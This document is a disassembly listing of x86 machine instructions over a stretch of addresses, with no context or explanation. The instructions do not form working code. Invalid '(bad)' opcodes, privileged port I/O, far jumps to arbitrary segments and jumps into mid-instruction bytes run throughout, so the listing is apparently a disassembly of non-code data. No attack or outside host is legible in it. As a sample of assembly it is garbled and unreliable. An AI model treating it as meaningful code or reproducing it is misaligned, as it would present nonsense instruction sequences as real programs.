  4164be:	imul   edx,DWORD PTR [ebp+0x59151ef7],0xffffff90
  4164c5:	add    al,0x80
  4164c7:	jno    0x4164f9
  4164c9:	in     al,0xcb
  4164cb:	lahf   
  4164cc:	sub    edi,DWORD PTR [eax+0x7e10fe41]
  4164d2:	mov    eax,ds:0x5ffa4d61
  4164d7:	adc    ebx,ebp
  4164d9:	repz out 0xf1,al
  4164dc:	into   
  4164dd:	loope  0x416539
  4164df:	aas    
  4164e0:	pop    ss
  4164e1:	lods   eax,DWORD PTR ds:[esi]
  4164e2:	cmc    
  4164e3:	adc    DWORD PTR [eax+0x40],esp
  4164e6:	jp     0x416520
  4164e8:	jb     0x4164d7
  4164ea:	mov    ecx,ebp
  4164ec:	int3   
  4164ed:	mov    al,0x18
  4164ef:	pop    ss
  4164f0:	mov    ds:0x709ea918,eax
  4164f5:	sbb    al,0x57
  4164f7:	aaa    
  4164f8:	add    esi,DWORD PTR [ebp+0x52]
  4164fb:	ror    DWORD PTR [edi-0x49f3d325],0x94
  416502:	aas    
  416503:	jg     0x41656e
  416505:	cmp    eax,0x9000aa63
  41650a:	das    
  41650b:	ficomp WORD PTR [ebp+0x2a]
  41650e:	sub    bl,ch
  416510:	in     al,0xf0
  416512:	pop    ecx
  416513:	xchg   DWORD PTR [esi],ebp
  416515:	leave  
  416516:	shl    DWORD PTR [ebp+0x539abdb8],1
  41651c:	(bad)  
  41651d:	mov    esp,0xa6705c67
  416522:	int3   
  416523:	or     BYTE PTR [ecx+0x22aa6faf],cl
  416529:	icebp  
  41652a:	test   eax,0xc9d7ffe3
  41652f:	pop    ss
  416530:	cmc    
  416531:	push   es
  416532:	fistp  QWORD PTR [esi+0x73a24f80]
  416538:	popa   
  416539:	push   ecx
  41653a:	pop    ebp
  41653b:	jp     0x416530
  41653d:	shr    DWORD PTR [eax],1
  41653f:	push   edi
  416540:	sbb    BYTE PTR [esi],0x33
  416543:	jae    0x4164eb
  416545:	mov    al,0x70
  416547:	sahf   
  416548:	repz or DWORD PTR [eax+0x383c21f0],esp
  41654f:	lock jae 0x41657b
  416552:	ins    DWORD PTR es:[edi],dx
  416553:	fst    QWORD PTR [edi]
  416555:	lock scas eax,DWORD PTR es:[edi]
  416557:	jp     0x4165c6
  416559:	fisttp WORD PTR [ebp-0x3e]
  41655c:	pop    eax
  41655d:	retf   
  41655e:	cdq    
  41655f:	in     al,0xfc
  416561:	icebp  
  416562:	mov    DWORD PTR [ecx],ebp
  416564:	inc    eax
  416565:	lea    esp,[ecx+0x2df4bbee]
  41656b:	ss xchg ecx,eax
  41656d:	inc    edx
  41656e:	sub    ebp,0x496f8ea9
  416574:	push   edi
  416575:	dec    ebp
  416576:	mov    ds:0xe473126a,eax
  41657b:	or     ecx,DWORD PTR [edi]
  41657d:	cmp    ebx,DWORD PTR [ebp+0x4f546499]
  416583:	mov    esp,0xc4c9776d
  416588:	or     BYTE PTR [ecx-0x57bae855],al
  41658e:	mov    ds:0x68e68cc,eax
  416593:	out    dx,al
  416594:	aam    0x2d
  416596:	test   al,0xfe
  416598:	mov    esp,0x16b4762f
  41659d:	jmp    0xaab0:0xd009bf71
  4165a4:	addr16 hlt 
  4165a6:	imul   eax,DWORD PTR [edi-0x22],0x1e
  4165aa:	dec    edi
  4165ab:	lods   eax,DWORD PTR ds:[esi]
  4165ac:	daa    
  4165ad:	in     al,dx
  4165ae:	xor    ebx,DWORD PTR [edi+0x63]
  4165b1:	pop    esi
  4165b2:	fcomp  DWORD PTR [esp+esi*4+0x3b03cdb]
  4165b9:	aaa    
  4165ba:	jne    0x4165c9
  4165bc:	bound  esi,QWORD PTR [ecx-0x4cbe71ac]
  4165c2:	xor    BYTE PTR [esi+0x4385451f],0x37
  4165c9:	push   cs
  4165ca:	mov    eax,?
  4165cc:	fcomp  QWORD PTR [edx]
  4165ce:	add    BYTE PTR [ebx+0x2eff5666],ch
  4165d4:	xchg   DWORD PTR [ecx+0x57],esi
  4165d7:	push   cs
  4165d8:	in     al,dx
  4165d9:	mov    ebp,0xe0e1cb9b
  4165de:	inc    edx
  4165df:	loopne 0x4165b7
  4165e1:	sub    DWORD PTR [edi+0x70d61ccc],ebp
  4165e7:	mov    ebx,DWORD PTR [eax+0x4f75662a]
  4165ed:	or     eax,0x3d6a7198
  4165f2:	fisubr DWORD PTR [edx]
  4165f4:	jb     0x41662b
  4165f6:	dec    ecx
  4165f7:	xchg   edx,eax
  4165f8:	push   ebp
  4165f9:	pop    esi
  4165fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165fb:	sub    eax,0x9c5e5974
  416600:	pop    ebx
  416601:	or     al,0x53
  416603:	sub    BYTE PTR [esi],dl
  416605:	jnp    0x416661
  416607:	mov    eax,0x4bbee9b6
  41660c:	pop    eax
  41660d:	mov    ah,ah
  41660f:	adc    eax,0x74ae13fb
  416614:	fcomp  DWORD PTR [edi+0x32]
  416617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416618:	mov    edx,0x6851f12e
  41661d:	lods   eax,DWORD PTR ds:[esi]
  41661e:	in     eax,dx
  41661f:	cli    
  416620:	mov    bl,0x74
  416622:	or     DWORD PTR [eax-0x75],ebx
  416625:	push   ebp
  416626:	and    al,0x22
  416628:	test   eax,0x7868584a
  41662d:	mov    bh,0x55
  41662f:	int    0xe6
  416631:	stc    
  416632:	or     al,0x60
  416634:	mov    DWORD PTR [ecx+ebx*2+0x792e883b],ecx
  41663b:	(bad)  
  41663c:	in     eax,dx
  41663d:	pushf  
  41663e:	sbb    DWORD PTR [ebp+0x55],edi
  416641:	push   ecx
  416642:	lods   al,BYTE PTR ds:[esi]
  416643:	in     eax,0x66
  416645:	shl    ah,1
  416647:	mov    ds:0x9bdf7950,eax
  41664c:	xchg   edi,eax
  41664d:	pop    ecx
  41664e:	add    al,0x78
  416650:	test   DWORD PTR [ebp+0x5001f452],ebp
  416656:	ficom  DWORD PTR [eax]
  416658:	sbb    dh,bh
  41665a:	mov    cl,0x72
  41665c:	cwde   
  41665d:	leave  
  41665e:	pop    ecx
  41665f:	adc    eax,0xc4efc9d9
  416664:	rcr    DWORD PTR [ebx+0x14648ab6],1
  41666a:	enter  0x5388,0x3e
  41666e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41666f:	cmp    al,0x13
  416671:	dec    ecx
  416672:	push   es
  416673:	mov    ebx,0x6370bd84
  416678:	sbb    DWORD PTR [ebx+eiz*1],esi
  41667b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41667c:	outs   dx,DWORD PTR ds:[esi]
  41667d:	test   DWORD PTR [eax],ecx
  41667f:	cmp    DWORD PTR [ebx+edx*1+0x4d],ebx
  416683:	ficomp WORD PTR [ecx]
  416685:	stos   DWORD PTR es:[edi],eax
  416686:	scas   eax,DWORD PTR es:[edi]
  416687:	pushf  
  416688:	hlt    
  416689:	in     eax,0xa
  41668b:	adc    BYTE PTR [esi+0x7f],bh
  41668e:	loop   0x4166b2
  416690:	sub    ecx,ebp
  416692:	test   al,0x46
  416694:	stos   DWORD PTR es:[edi],eax
  416695:	dec    BYTE PTR [esp+ebx*2]
  416698:	xor    esi,DWORD PTR [edx+0x679aa6ad]
  41669e:	jae    0x416704
  4166a0:	sub    bh,cl
  4166a2:	lss    ebx,FWORD PTR [esi+edi*8-0x3c]
  4166a7:	rcr    BYTE PTR [edx+0x7a],1
  4166aa:	dec    edi
  4166ab:	xchg   esp,eax
  4166ac:	(bad)  
  4166ad:	stos   BYTE PTR es:[edi],al
  4166ae:	mov    fs,WORD PTR [ebx]
  4166b0:	push   edx
  4166b1:	adc    DWORD PTR ds:0x812bed6a,0x30
  4166b8:	ror    DWORD PTR [ecx],cl
  4166ba:	xor    eax,0x6d67d01a
  4166bf:	mov    DWORD PTR [esi],esp
  4166c1:	pop    ecx
  4166c2:	adc    eax,0x78457863
  4166c7:	arpl   WORD PTR [ecx-0x205a7635],di
  4166cd:	cmp    BYTE PTR [ecx-0x41f767a4],ah
  4166d3:	pop    DWORD PTR [edx-0x40]
  4166d6:	in     eax,dx
  4166d7:	sbb    esp,edx
  4166d9:	imul   edi,DWORD PTR [eax],0xffffffe9
  4166dc:	pop    ebx
  4166dd:	dec    ecx
  4166de:	mov    edx,0xf3ba1206
  4166e3:	push   ebp
  4166e4:	mov    ah,0x12
  4166e6:	cmp    esi,ecx
  4166e8:	pop    es
  4166e9:	push   eax
  4166ea:	jne    0x416737
  4166ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166ed:	and    al,0x28
  4166ef:	stos   BYTE PTR es:[edi],al
  4166f0:	sbb    ebp,DWORD PTR [esi]
  4166f2:	lods   eax,DWORD PTR ds:[esi]
  4166f3:	and    DWORD PTR [edi+0x5e330065],ebp
  4166f9:	pop    ebp
  4166fa:	aaa    
  4166fb:	scas   al,BYTE PTR es:[edi]
  4166fc:	pop    ds
  4166fd:	sbb    al,0x72
  4166ff:	addr16 adc al,0x14
  416702:	bound  edx,QWORD PTR [edx+ebp*1-0x18d51e4d]
  416709:	push   esp
  41670a:	dec    edi
  41670b:	fistp  QWORD PTR [ebp-0x5a93ced0]
  416711:	pop    ss
  416712:	push   ss
  416713:	test   al,0x12
  416715:	xchg   esi,eax
  416716:	xor    edx,DWORD PTR [ebx-0x74aece0f]
  41671c:	aam    0x49
  41671e:	in     al,dx
  41671f:	dec    ebp
  416720:	rol    BYTE PTR [eax],1
  416722:	or     al,0xf3
  416725:	jmp    0xbd15:0x12685e03
  41672c:	les    eax,FWORD PTR [ebx+ecx*2+0x45f97ea0]
  416733:	repnz and al,BYTE PTR [edi]
  416736:	push   0x2b42618e
  41673b:	test   ecx,esi
  41673d:	mov    esi,0x11d7751c
  416742:	aam    0x9c
  416744:	or     bl,ch
  416746:	test   al,0xab
  416748:	cmp    bh,BYTE PTR [esi+0x6d]
  41674b:	div    DWORD PTR [ebp+0x45d6ad70]
  416751:	outs   dx,DWORD PTR ds:[esi]
  416752:	pop    edx
  416753:	jmp    0xd793:0xc020023f
  41675a:	mov    eax,ds:0x32ad974f
  41675f:	push   eax
  416760:	sbb    DWORD PTR [ebx+0x5b078e35],ecx
  416766:	jp     0x416769
  416768:	inc    ecx
  416769:	shl    BYTE PTR [eax],cl
  41676b:	ret    
  41676c:	scas   eax,DWORD PTR es:[edi]
  41676d:	ja     0x416770
  41676f:	nop
  416770:	pusha  
  416771:	push   edx
  416772:	mov    edx,0x4fa6c6ab
  416777:	sub    eax,0xa51c6ac9
  41677c:	add    edi,DWORD PTR [edx+0x6b]
  41677f:	ret    
  416780:	cmp    al,0xf5
  416782:	jmp    0xce3ea35a
  416787:	fnop   
  416789:	out    0xf3,al
  41678b:	mov    esp,0x1b70c000
  416790:	repz test DWORD PTR [edi+0x48b2686f],eax
  416797:	call   0x687f3e4e
  41679c:	xchg   BYTE PTR [edi+0x6da44eb9],cl
  4167a2:	push   cs
  4167a3:	dec    ecx
  4167a4:	dec    esp
  4167a5:	shl    DWORD PTR [ebx+0x77],1
  4167a8:	je     0x4167e1
  4167aa:	mov    edx,DWORD PTR [ebp-0x57]
  4167ad:	cwde   
  4167ae:	inc    edi
  4167af:	out    dx,eax
  4167b0:	gs enter 0xcdbd,0xfb
  4167b5:	adc    edx,DWORD PTR [ebx-0x798e6b11]
  4167bb:	jmp    0x5559551
  4167c0:	xor    eax,0xbccc70c4
  4167c5:	jp     0x416827
  4167c7:	(bad)  
  4167c9:	dec    edi
  4167ca:	pop    ds
  4167cb:	xlat   BYTE PTR ds:[ebx]
  4167cc:	gs mov esp,esi
  4167cf:	std    
  4167d0:	bound  edx,QWORD PTR es:[edx]
  4167d3:	push   0xffffffe5
  4167d5:	mov    dl,0xdc
  4167d7:	jb     0x41679e
  4167d9:	push   0xffffffeb
  4167db:	cs pop ds
  4167dd:	push   esp
  4167de:	inc    ebx
  4167df:	outs   dx,DWORD PTR ds:[esi]
  4167e0:	inc    esp
  4167e1:	lods   eax,DWORD PTR ds:[esi]
  4167e2:	jge    0x4167d3
  4167e4:	sbb    ebx,ebp
  4167e6:	in     al,dx
  4167e7:	inc    esp
  4167e8:	dec    edi
  4167e9:	jnp    0x4167f6
  4167eb:	mov    dh,BYTE PTR ds:0x1c0ab0bb
  4167f1:	dec    esp
  4167f2:	aaa    
  4167f3:	shl    BYTE PTR ds:0x3a6f4d59,1
  4167f9:	scas   eax,DWORD PTR es:[edi]
  4167fa:	and    DWORD PTR [esi+0x28],edi
  4167fd:	push   0x78
  4167ff:	mov    cs,WORD PTR [eax-0x109333a0]
  416805:	call   0x929d:0x2a6f3edc
  41680c:	cs dec esp
  41680e:	jb     0x4167fe
  416810:	shl    DWORD PTR [esi+0xa],1
  416813:	mov    edx,0xf206b120
  416818:	xchg   edi,eax
  416819:	in     al,dx
  41681a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41681b:	jae    0x41682e
  41681d:	or     ebp,esp
  41681f:	jno    0x4167a5
  416821:	shl    ebp,1
  416823:	or     ecx,DWORD PTR ds:0xdd644bf3
  416829:	repnz inc edx
  41682b:	fs push ebx
  41682d:	mov    ds:0xc9f3106e,eax
  416832:	sub    DWORD PTR [edx-0x42],edi
  416835:	mov    es,ecx
  416837:	lock enter 0x263,0x32
  41683c:	mov    eax,0x25211928
  416841:	(bad)  
  416842:	aad    0x54
  416844:	mov    ebp,DWORD PTR [ebx+0x54]
  416847:	or     al,0xe6
  416849:	test   eax,0x86e0ea56
  41684e:	out    0x91,al
  416850:	dec    ecx
  416851:	jecxz  0x416874
  416853:	xchg   ebx,eax
  416854:	mov    bl,0xb5
  416856:	pop    es
  416857:	das    
  416858:	mov    bh,0x13
  41685a:	or     eax,ebx
  41685c:	push   0x3aeb15da
  416861:	mov    al,0xf7
  416863:	add    ebx,ebx
  416865:	or     eax,0x59ee7dd1
  41686a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41686b:	stos   BYTE PTR es:[edi],al
  41686c:	xchg   edx,eax
  41686d:	ins    DWORD PTR es:[edi],dx
  41686e:	xor    eax,0xc541a47
  416873:	pop    ss
  416874:	hlt    
  416875:	mov    BYTE PTR [edi+0x5d8788e6],ah
  41687b:	and    eax,0xf8e04f36
  416880:	add    al,0xb2
  416882:	cwde   
  416883:	mov    ecx,0x7b0b63d8
  416888:	adc    al,BYTE PTR [ebx]
  41688a:	push   0x1
  41688c:	iret   
  41688d:	call   0xbfd:0x9d77efd7
  416894:	sub    esp,esi
  416896:	xor    eax,0x41346dac
  41689b:	sub    WORD PTR [ecx+ebx*8-0x557cd9a5],sp
  4168a3:	adc    edx,DWORD PTR [ebx]
  4168a5:	sbb    eax,0xe8e8f746
  4168aa:	mov    DWORD PTR [edi-0x6149d1d2],ebp
  4168b0:	shl    BYTE PTR [eax+eax*4+0x62],0x5f
  4168b5:	repz and ch,BYTE PTR [edi]
  4168b8:	hlt    
  4168b9:	cwde   
  4168ba:	jp     0x4168d1
  4168bc:	mov    bh,0x33
  4168be:	(bad)  
  4168bf:	push   edi
  4168c0:	inc    esp
  4168c1:	adc    eax,0xd37af73d
  4168c6:	push   0xffffffe5
  4168c8:	sub    DWORD PTR [eax],0x157e24c3
  4168ce:	rol    al,0x48
  4168d1:	ds xchg ebx,eax
  4168d3:	inc    ecx
  4168d4:	adc    eax,0x4b6d846
  4168d9:	xor    bl,BYTE PTR [esi-0x2]
  4168dc:	sti    
  4168dd:	das    
  4168de:	jl     0x4168e2
  4168e0:	mov    esi,0x52261b14
  4168e5:	das    
  4168e6:	daa    
  4168e7:	sar    BYTE PTR [ebx+0x7b3fac73],cl
  4168ed:	shr    dh,0x2e
  4168f0:	fdiv   DWORD PTR [edx-0x75885268]
  4168f6:	or     al,0xe0
  4168f8:	add    al,ah
  4168fa:	add    edx,DWORD PTR [ebx]
  4168fc:	pop    esi
  4168fd:	inc    esi
  4168fe:	push   es
  4168ff:	scas   eax,DWORD PTR es:[edi]
  416900:	scas   al,BYTE PTR es:[edi]
  416901:	gs inc ebx
  416903:	cmp    BYTE PTR [edx+ebx*2+0x4e],dh
  416907:	jecxz  0x41690e
  416909:	add    al,0x9c
  41690b:	sub    al,0x47
  41690d:	add    al,BYTE PTR [edx+0x18]
  416910:	or     BYTE PTR [eax],dl
  416912:	mov    ebp,DWORD PTR [edx]
  416914:	iret   
  416915:	and    eax,0x45f88d7c
  41691a:	scas   al,BYTE PTR es:[edi]
  41691b:	or     eax,0xc2100506
  416920:	xchg   ecx,eax
  416921:	jmp    edi
  416923:	jae    0x416915
  416925:	xor    esp,esi
  416927:	adc    DWORD PTR [ecx],0x9f182bba
  41692d:	jo     0x41698f
  41692f:	addr16 shl esi,cl
  416932:	add    edx,0xffffff9d
  416935:	es mov BYTE PTR ss:[ecx+0x554eb058],bl
  41693d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41693e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41693f:	push   ebp
  416940:	dec    ebp
  416941:	inc    esp
  416942:	mov    ch,dh
  416944:	or     eax,ecx
  416946:	rcr    BYTE PTR [eax+eax*2+0x44b10945],cl
  41694d:	jg     0x4169ae
  41694f:	mov    ah,0x50
  416951:	test   BYTE PTR [ebp+eax*4+0x34ed70ae],al
  416958:	mov    BYTE PTR [edx+ecx*1-0x566b9ddd],bl
  41695f:	xor    dl,bh
  416961:	push   ss
  416962:	hlt    
  416963:	dec    edi
  416964:	test   DWORD PTR [ecx+ebx*1-0x38],edi
  416968:	inc    eax
  416969:	lock rol BYTE PTR [ecx],1
  41696c:	std    
  41696d:	adc    bh,BYTE PTR [ebx+0x38]
  416970:	mov    DWORD PTR [ecx+0x37d84adc],ebx
  416976:	je     0x416992
  416978:	(bad)  
  416979:	jns    0x416968
  41697b:	fwait
  41697c:	xchg   edi,eax
  41697d:	adc    al,0x47
  41697f:	xchg   edx,eax
  416980:	es (bad) 
  416982:	mov    ecx,0x528d3258
  416987:	cmp    DWORD PTR [ecx],ecx
  416989:	mov    eax,0x7b56c499
  41698e:	js     0x4169e5
  416990:	shl    DWORD PTR [eax-0x4d],0xc
  416994:	data16 and al,0xd7
  416997:	imul   ebx,DWORD PTR [edi+0x17],0xffffffec
  41699b:	pushf  
  41699c:	mov    ds:0x462b4574,eax
  4169a1:	pop    edx
  4169a2:	aaa    
  4169a3:	dec    dx
  4169a5:	scas   al,BYTE PTR es:[edi]
  4169a6:	mov    esp,0x7de92834
  4169ab:	xlat   BYTE PTR ds:[ebx]
  4169ac:	push   ds
  4169ad:	call   0x8d55:0xb25f6a5b
  4169b4:	push   ss
  4169b5:	xlat   BYTE PTR ds:[ebx]
  4169b6:	idiv   DWORD PTR [ebx+0x14]
  4169b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169ba:	mov    esi,DWORD PTR [edi+0x5a]
  4169bd:	and    al,0x63
  4169bf:	pop    ebp
  4169c0:	int    0x2
  4169c2:	bound  edx,QWORD PTR [ecx-0x51]
  4169c5:	pop    edx
  4169c6:	and    DWORD PTR [ecx+0x7e],0xa61dd9fb
  4169cd:	cmp    al,0x88
  4169cf:	adc    eax,0x2c5569f0
  4169d4:	clc    
  4169d5:	inc    esp
  4169d6:	mov    al,0xc7
  4169d8:	ret    
  4169d9:	xlat   BYTE PTR ds:[ebx]
  4169da:	push   ss
  4169db:	pop    ds
  4169dc:	std    
  4169dd:	push   edx
  4169de:	ror    BYTE PTR [eax+0x44],1
  4169e1:	cmp    WORD PTR [ebx],0x20
  4169e5:	xchg   esp,eax
  4169e6:	test   BYTE PTR [ecx],cl
  4169e8:	aad    0x56
  4169ea:	sbb    BYTE PTR [edi-0x5e],bl
  4169ed:	jae    0x4169f4
  4169ef:	and    esp,DWORD PTR [edi]
  4169f1:	(bad)  
  4169f2:	pop    ebp
  4169f3:	imul   ebx,edx,0xe08f4843
  4169f9:	retf   0xc3f5
  4169fc:	mov    DWORD PTR [ebx-0x33],0xbd9d1833
  416a03:	and    al,0x9b
  416a05:	xchg   esp,eax
  416a06:	cmp    DWORD PTR ds:0x6e974f46,ebx
  416a0c:	dec    ecx
  416a0d:	xor    bl,BYTE PTR [eax+0x2d0d3c24]
  416a13:	fbstp  TBYTE PTR [ebp+0x7e3d0ed7]
  416a19:	out    dx,eax
  416a1a:	xchg   ebx,eax
  416a1b:	lahf   
  416a1c:	imul   edx,esi,0x28
  416a1f:	cmp    al,0x87
  416a21:	sbb    ch,BYTE PTR [edi+eiz*8]
  416a24:	pusha  
  416a25:	dec    ecx
  416a26:	nop
  416a27:	je     0x416a97
  416a29:	add    DWORD PTR [esp+edx*4],edi
  416a2c:	xchg   esi,eax
  416a2d:	mov    dl,0x27
  416a2f:	ja     0x416a15
  416a31:	push   ss
  416a32:	and    DWORD PTR [edx-0x5f],ebp
  416a35:	pop    ds
  416a36:	scas   eax,DWORD PTR es:[edi]
  416a37:	mov    ds:0x6471a228,al
  416a3c:	pop    edx
  416a3d:	outs   dx,DWORD PTR ds:[esi]
  416a3e:	pusha  
  416a3f:	lds    eax,FWORD PTR [esi+0x1f]
  416a42:	mov    edx,0x5805cd08
  416a47:	and    al,0x3e
  416a49:	jg     0x4169fa
  416a4b:	ss js  0x4169e3
  416a4e:	mov    ecx,0xb4cff298
  416a53:	sbb    eax,0xeba4964c
  416a58:	dec    esi
  416a59:	stos   DWORD PTR es:[edi],eax
  416a5a:	pop    edi
  416a5b:	jo     0x416a50
  416a5d:	rol    BYTE PTR [ebx-0x61],0xd8
  416a61:	rcr    DWORD PTR [ebx+0x7f221b33],cl
  416a67:	pop    edi
  416a68:	sub    eax,0x248b8b9d
  416a6d:	imul   cx,bx,0x24a5
  416a72:	dec    esi
  416a73:	cmp    eax,0x45d741b3
  416a78:	psrad  mm4,mm2
  416a7b:	inc    edi
  416a7c:	sbb    al,0x89
  416a7e:	inc    edx
  416a7f:	and    al,0x51
  416a81:	mov    cl,0xf
  416a83:	sbb    al,0x1d
  416a85:	in     eax,0x5a
  416a87:	mov    bl,0x44
  416a89:	xchg   esp,eax
  416a8a:	popa   
  416a8b:	fmul   DWORD PTR [esi+0x5fd4efb7]
  416a91:	and    BYTE PTR [eax-0x66],ah
  416a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a95:	scas   al,BYTE PTR es:[edi]
  416a96:	cmc    
  416a97:	cmp    BYTE PTR [esi],0x40
  416a9a:	jg     0x416abf
  416a9c:	jle    0x416a60
  416a9e:	adc    DWORD PTR [eax],edi
  416aa0:	cli    
  416aa1:	in     al,0x26
  416aa3:	xchg   edi,eax
  416aa4:	add    eax,0xb7455ce
  416aa9:	pop    eax
  416aaa:	jnp    0x416aa8
  416aac:	push   esp
  416aad:	dec    ebp
  416aae:	sub    al,0x50
  416ab0:	cmp    DWORD PTR [edx+0x4c45cc5a],edx
  416ab6:	dec    bl
  416ab8:	ficomp DWORD PTR [ebx-0x5eebb24]
  416abe:	xchg   BYTE PTR [edx-0xe704094],ch
  416ac4:	popa   
  416ac5:	mov    edx,0x73dabd8c
  416aca:	add    al,0x7
  416acc:	xor    DWORD PTR [esp+edi*4],0x507ec0c3
  416ad3:	ror    bh,0x3a
  416ad6:	iret   
  416ad7:	iret   
  416ad8:	jo     0x416b45
  416ada:	stos   BYTE PTR es:[edi],al
  416adb:	pop    edx
  416adc:	dec    ebx
  416add:	jne    0x416aa3
  416adf:	jle    0x416b26
  416ae1:	mov    ds:0x87f43b52,al
  416ae6:	outs   dx,BYTE PTR ds:[esi]
  416ae7:	call   0x7122311
  416aec:	rcr    DWORD PTR [ecx+0xf],1
  416aef:	or     eax,DWORD PTR [esi]
  416af1:	stc    
  416af2:	inc    edi
  416af3:	add    esp,DWORD PTR [eax-0x501eaf80]
  416af9:	mov    DWORD PTR [ebx-0x43],eax
  416afc:	ins    BYTE PTR es:[edi],dx
  416afd:	jbe    0x416a95
  416aff:	xchg   esp,eax
  416b00:	inc    edi
  416b01:	out    dx,al
  416b02:	jmp    0x416a8e
  416b04:	daa    
  416b05:	lods   eax,DWORD PTR ds:[esi]
  416b06:	adc    al,0x30
  416b08:	jge    0x416aec
  416b0a:	nop
  416b0b:	or     DWORD PTR [ebx+0xc],eax
  416b0e:	into   
  416b0f:	or     ah,BYTE PTR [ebp+0x1427a8da]
  416b15:	jl     0x416aed
  416b17:	dec    eax
  416b18:	sub    eax,0xca054192
  416b1d:	outs   dx,BYTE PTR ds:[esi]
  416b1e:	ja     0x416b4e
  416b20:	inc    esi
  416b21:	xchg   ebx,eax
  416b22:	adc    BYTE PTR [esi+ebx*8-0x4a],dh
  416b26:	fs sub ch,dh
  416b29:	and    dh,BYTE PTR [ebx-0x39]
  416b2c:	mov    cl,0x3c
  416b2e:	fwait
  416b2f:	int    0x18
  416b31:	push   edx
  416b32:	ret    
  416b33:	fsubr  QWORD PTR [ebp-0x41f30a32]
  416b39:	retf   
  416b3a:	jo     0x416b5c
  416b3c:	cmp    eax,0xc20c72ce
  416b41:	sbb    bh,BYTE PTR [edx]
  416b43:	ja     0x416b43
  416b45:	es pop eax
  416b47:	icebp  
  416b48:	(bad)  
  416b49:	fild   DWORD PTR [esi-0x367770a2]
  416b4f:	mov    bh,ch
  416b51:	sub    bh,BYTE PTR [esi+eax*8]
  416b54:	mov    ebx,0xd93f3379
  416b59:	mov    ds:0x6b0b2239,al
  416b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b5f:	sub    eax,0xac2fe353
  416b64:	sub    eax,0x81e0508b
  416b69:	push   esp
  416b6a:	cmp    eax,0x3e8d3caa
  416b6f:	in     al,0x42
  416b71:	dec    ebp
  416b72:	dec    ebp
  416b73:	int3   
  416b74:	mov    cl,0xe0
  416b76:	rcr    BYTE PTR [ebp+0x5c0918e4],1
  416b7c:	xchg   esi,eax
  416b7d:	lock (bad) [edx]
  416b80:	loope  0x416b42
  416b82:	add    ah,dh
  416b84:	mov    eax,0xd5a0617d
  416b89:	xor    DWORD PTR [edx-0x1d],eax
  416b8c:	xchg   ecx,eax
  416b8d:	push   esp
  416b8e:	outs   dx,DWORD PTR ds:[esi]
  416b8f:	addr16 int 0x11
  416b92:	in     al,0x0
  416b94:	xchg   esp,eax
  416b95:	sbb    eax,0x2783311
  416b9a:	aaa    
  416b9b:	mov    dl,0x82
  416b9d:	sub    BYTE PTR [esi-0x6f],0x82
  416ba1:	call   DWORD PTR [ecx-0x15870a02]
  416ba7:	add    ch,al
  416ba9:	sbb    DWORD PTR [eax-0x12],ebp
  416bac:	mov    ah,al
  416bae:	inc    esi
  416baf:	pop    esp
  416bb0:	pop    ecx
  416bb1:	sbb    al,0x7d
  416bb3:	push   ds
  416bb4:	iret   
  416bb5:	pushf  
  416bb6:	ins    BYTE PTR es:[edi],dx
  416bb7:	sbb    eax,0xe8c32212
  416bbc:	ins    DWORD PTR es:[di],dx
  416bbe:	mov    dh,BYTE PTR [edi+ecx*4+0x2c0cf42e]
  416bc5:	push   0xffffff83
  416bc7:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  416bc9:	lock mov ebx,0xd5f7b6ca
  416bcf:	popa   
  416bd0:	es push ebp
  416bd2:	les    ebp,FWORD PTR [edx+0x723a8ef2]
  416bd8:	aaa    
  416bd9:	lock inc eax
  416bdb:	mov    ebx,0xd079d30f
  416be0:	cmp    esi,DWORD PTR [edi+0x64]
  416be3:	retf   0xe56d
  416be6:	mov    ds:0x1806cf38,eax
  416beb:	sbb    cl,BYTE PTR [edi-0x1c2e22ff]
  416bf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bf2:	imul   esi,DWORD PTR [esi],0xb3788183
  416bf8:	mov    al,ds:0x701f4a00
  416bfd:	push   0xffffffca
  416bff:	jnp    0x416c49
  416c01:	add    ch,BYTE PTR [edi-0x809da1f]
  416c07:	scas   eax,DWORD PTR es:[edi]
  416c08:	ins    DWORD PTR es:[edi],dx
  416c09:	in     eax,dx
  416c0a:	loopne 0x416bac
  416c0c:	mov    esi,0x15c0cf4a
  416c11:	dec    edi
  416c12:	ins    BYTE PTR es:[edi],dx
  416c13:	call   0xc451:0x42ff3c11
  416c1a:	and    eax,0xf6ba9af4
  416c1f:	xchg   edx,eax
  416c20:	dec    ecx
  416c21:	sti    
  416c22:	jnp    0x416bd3
  416c24:	and    al,0x9a
  416c26:	jo     0x416bb1
  416c28:	fcos   
  416c2a:	(bad)  
  416c2b:	icebp  
  416c2c:	fstp   QWORD PTR [esi+0x3129ecb8]
  416c32:	loope  0x416bf3
  416c34:	icebp  
  416c35:	cdq    
  416c36:	dec    edi
  416c37:	mov    ebp,0xa98f765
  416c3c:	push   esi
  416c3d:	enter  0xe748,0x6c
  416c41:	js     0x416c70
  416c43:	inc    ecx
  416c44:	dec    esi
  416c45:	aaa    
  416c46:	sbb    DWORD PTR [edi+0x175e337a],ebx
  416c4c:	and    bl,dh
  416c4e:	mov    edx,0x12a3144e
  416c53:	pop    esp
  416c54:	push   ecx
  416c55:	fisubr WORD PTR [eax+edx*1]
  416c58:	and    BYTE PTR [ebx],0x72
  416c5b:	pop    ecx
  416c5c:	or     DWORD PTR [edx],esp
  416c5e:	cmp    edx,DWORD PTR [edx]
  416c60:	xchg   edx,eax
  416c61:	mov    WORD PTR [ecx+ebp*4+0x6b56ef67],ss
  416c68:	cwde   
  416c69:	xor    DWORD PTR [ecx-0x131e8e0a],ebp
  416c6f:	mov    ebx,0x223cddbc
  416c74:	mov    cl,0x26
  416c76:	iret   
  416c77:	test   al,0xc
  416c79:	call   0x1c72:0x22413e85
  416c80:	lea    ecx,[edi+ecx*4-0x4015c337]
  416c87:	cmp    eax,0xcd1eff94
  416c8c:	js     0x416c70
